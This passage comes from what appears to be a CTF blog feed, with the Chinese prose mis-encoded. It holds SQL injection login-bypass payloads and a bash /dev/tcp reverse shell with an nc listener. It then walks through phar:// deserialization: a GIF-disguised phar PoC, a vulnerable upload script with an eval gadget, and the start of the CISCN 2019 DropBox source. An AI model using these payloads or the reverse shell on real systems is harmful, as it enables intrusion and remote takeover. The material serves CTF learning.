href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^(1)^1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–æ³¨å…¥"><a href="#å…¶ä»–æ³¨å…¥" class="headerlink" title="å…¶ä»–æ³¨å…¥"></a>å…¶ä»–æ³¨å…¥</h3><p><strong>union_md5()</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin' union <span class="keyword">select</span> <span class="number">1</span>,ma5(<span class="number">1</span>) %<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="åå¼¹shelll"><a href="#åå¼¹shelll" class="headerlink" title="åå¼¹shelll"></a>åå¼¹shelll</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> VPSï¼š</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> å‘½ä»¤æ‰§è¡Œç‚¹ï¼š</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ¯”èµ›æ€»æ˜¯è‡ªé—­ï¼Œç»§ç»­åŠ æ²¹å§= =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æ‰“æ¯”èµ›çš„æ—¶å€™ä¸€ä¸ªå˜é‡è¦†ç›–çœ‹äº†åŠå¤©ï¼Œè¿˜æ˜¯é˜Ÿé‡Œå¸ˆå‚…æé†’ç”¨php://inputï¼Œå‘ç°è‡ªå·±åŸºç¡€å¾ˆå¼±ï¼Œäºæ˜¯æŠŠåŸºç¡€å¹³å°çš„Webåˆ·äº†ä¸€éï¼Œè®°å½•ä¸‹ä¸€äº›æœ‰ä»·
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>phar://ååºåˆ—åŒ–å†å­¦ä¹ </title>
    <link href="https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-08-26T13:21:52.000Z</published>
    <updated>2019-08-27T03:20:43.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©å¤ç°æ—¶å‘ç°è‡ªå·±å…³äºpharååºåˆ—åŒ–äº†è§£å¾—ä¸å¤Ÿï¼Œç‰¹åœ°è®°å½•ä¸€ä¸‹åŠ æ·±å°è±¡ã€‚</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h3><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p><h3 id="pharæ–‡ä»¶ç»„æˆ"><a href="#pharæ–‡ä»¶ç»„æˆ" class="headerlink" title="pharæ–‡ä»¶ç»„æˆ"></a>pharæ–‡ä»¶ç»„æˆ</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png" alt=""></p><p><strong>è¿™é‡Œé‡ç‚¹å…³æ³¨ç®­å¤´éƒ¨åˆ†ï¼Œå®ƒä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åˆ©ç”¨çš„æ ¸å¿ƒã€‚</strong></p><h3 id="è§¦å‘ååºåˆ—åŒ–æ–¹å¼"><a href="#è§¦å‘ååºåˆ—åŒ–æ–¹å¼" class="headerlink" title="è§¦å‘ååºåˆ—åŒ–æ–¹å¼"></a>è§¦å‘ååºåˆ—åŒ–æ–¹å¼</h3><p>æ—¢ç„¶.pharæ–‡ä»¶ä¸­å­˜åœ¨å¯æ§çš„åºåˆ—åŒ–å†…å®¹ï¼Œä¸ºäº†é‡å†™å¯¹è±¡æˆ‘ä»¬è‡ªç„¶è¦æƒ³åŠæ³•è®©å®ƒååºåˆ—åŒ–ï¼Œåœ¨phpä¸­å¤§éƒ¨åˆ†ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œä¼šå°†<code>meta-data</code>ååºåˆ—åŒ–ï¼š</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png" alt=""></p><p><strong>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å­˜åœ¨file_get_contents($_GET[â€˜filenameâ€™])ç±»ä¼¼å‡½æ•°çš„æ—¶å€™ï¼Œmeta-dataä¸­çš„å†…å®¹ä¼šè‡ªè¡Œååºåˆ—åŒ–ï¼Œä¸éœ€è¦ååºåˆ—åŒ–å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯pharååºåˆ—åŒ–çš„ä¸€ä¸ªä¼˜ç‚¹ã€‚</strong></p><h2 id="ç®€å•æµ‹è¯•"><a href="#ç®€å•æµ‹è¯•" class="headerlink" title="ç®€å•æµ‹è¯•"></a>ç®€å•æµ‹è¯•</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ª.pharæ–‡ä»¶ï¼Œphpä¸­å­˜åœ¨Pharç±»å®ç°ç›¸å…³æ“ä½œã€‚</p><p><strong>æ³¨æ„ï¼šè¦ç”Ÿæˆ.pharæ–‡ä»¶ï¼Œéœ€è¦å…ˆå°†php.iniä¸­çš„phar.readonlyè®¾ç½®æˆOffï¼Œå¹¶å°†å‰é¢çš„;å»æ‰(php5.2æ²¡æœ‰è¯¥é…ç½®é¡¹)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phar.php =&gt; ç”Ÿæˆphar.phar</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();  <span class="comment">// **TestObjectç±» æ ¹æ®éœ€è¦ä¿®æ”¹**</span></span><br><span class="line">    $o -&gt; data=<span class="string">'hu3sky'</span>;</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_unser.php =&gt; è‡ªåŠ¨ååºåˆ—åŒ–é‡å†™å¯¹è±¡</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://phar.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®phar.phpç”Ÿæˆphar.pharï¼Œå› ä¸ºè¿™é‡ŒåŒ…å«äº†phar.pharï¼Œç›´æ¥è®¿é—®phar_unser.phpï¼ŒæˆåŠŸè¾“å‡ºæ„é€ å†…å®¹ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbPnJD.png" alt=""></p><h2 id="pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h2><p>ä¹‹å‰æåˆ°è¿‡<strong>pharæ‹“å±•é€šè¿‡ç»“å°¾çš„<code>__HALT_COMPILER();?&gt;</code>æ¥è¯†åˆ«æ˜¯å¦ä¸ºpharæ–‡ä»¶ï¼Œä¸ä¹‹å‰çš„å†…å®¹å’Œåç¼€åéƒ½æ— å…³ã€‚</strong>äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ·»åŠ æ–‡ä»¶å¤´+ä¿®æ”¹æ–‡ä»¶åç¼€æ¥ç»•è¿‡ä¸€äº›æ–‡ä»¶ç±»å‹é™åˆ¶ã€‚æ¯”è¾ƒå¸¸è§çš„æ˜¯ä¼ªè£…æˆGIFå›¾ç‰‡ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ­å»ºä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼Œé™åˆ¶åªå…è®¸ä¸Šä¼ gifç±»å‹å›¾ç‰‡ï¼Œç„¶åå†å†™ä¸€ä¸ªæœ‰ææ„å‡½æ•°çš„å¯ä»¥åˆ©ç”¨çš„ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload_file.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--upload_file.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./upload_file.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file_un.php å¯åˆ©ç”¨çš„ä»£ç </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename); <span class="comment">//å‡½æ•°è§£æphar://ä¼ªåè®®æ—¶è‡ªåŠ¨ååºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šæ²¡æœ‰<code>file_exist($filename)</code>å»è§£æä¼ªåè®®ï¼ˆæˆ–è€…ç±»ä¼¼å‡½æ•°ï¼Œä¸Šæ–‡æœ‰æåˆ°ï¼‰æ˜¯ä¸ä¼šè‡ªåŠ¨ååºåˆ—åŒ–çš„ã€‚</strong></p><p>ç„¶åæ ¹æ®ä¸Šé¢å¯åˆ©ç”¨çš„ä»£ç ç¼–å†™PoCï¼ˆè¿™ä¸ªæ¡†æ¶ç”¨å¾—å¾ˆå¤šï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ç±»åˆ°åº•æ˜¯ä»€ä¹ˆæ ¹æ®æƒ…å†µè‡ªè¡Œä¿®æ”¹</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç±»çš„å±æ€§è¦æ€ä¹ˆå†™æ ¹æ®æƒ…å†µè‡ªè¡Œä¿®æ”¹</span></span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line"></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>phar://</code>ä¼ªåè®®è®¿é—®ç›¸åº”æ–‡ä»¶æˆåŠŸæ‰§è¡Œ<code>phpinfo()</code>å‘½ä»¤ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbPclW.png" alt=""></p><h2 id="PHPååºåˆ—åŒ–å†å·©å›º"><a href="#PHPååºåˆ—åŒ–å†å·©å›º" class="headerlink" title="PHPååºåˆ—åŒ–å†å·©å›º"></a>PHPååºåˆ—åŒ–å†å·©å›º</h2><p>æˆ‘ç†è§£çš„PHPåº”è¯¥æ˜¯ï¼šå‘ç”¨æˆ·å¯æ§çš„unserialize()å‡½æ•°ä¸­ï¼Œä¼ å…¥ä¸€ä¸ªå«æœ‰ææ„å‡½æ•°çš„ç±»çš„å¯¹è±¡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆé€šå¸¸æ˜¯ç²¾å¿ƒæ„é€ çš„ï¼‰ï¼Œä½¿å…¶ååºåˆ—åŒ–ä¸ºå¯¹è±¡ä¹‹åæ‰§è¡Œææ„å‡½æ•°ï¼Œè¾¾åˆ°æˆ‘ä»¬çš„ä¸€äº›ç›®çš„ã€‚</p><h2 id="CISCN-2019-DropBox"><a href="#CISCN-2019-DropBox" class="headerlink" title="CISCN 2019 DropBox"></a>CISCN 2019 DropBox</h2><p>é¦–å…ˆé€šè¿‡æŠ“åŒ…fuzzï¼Œå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œ æŠŠæºç ä¸‹è½½ä¸‹æ¥ã€‚</p><p>è¿™é‡Œä¸»è¦çœ‹delete.phpå’Œclass.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å•çœ‹<code>delete.php</code>å‘ç°ä¸äº†ä»€ä¹ˆï¼Œåªæ˜¯ä¸€ä¸ªç®€å•çš„åˆ é™¤æ–‡ä»¶åŠŸèƒ½ï¼Œè¿™é‡Œæ³¨æ„åˆ°<code>$filename</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¦å¤–æ–°å»ºäº†$fileçš„å¯¹è±¡ï¼Œè°ƒç”¨äº†open()å‡½æ•°ï¼›æ¥ç€çœ‹<code>class.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = 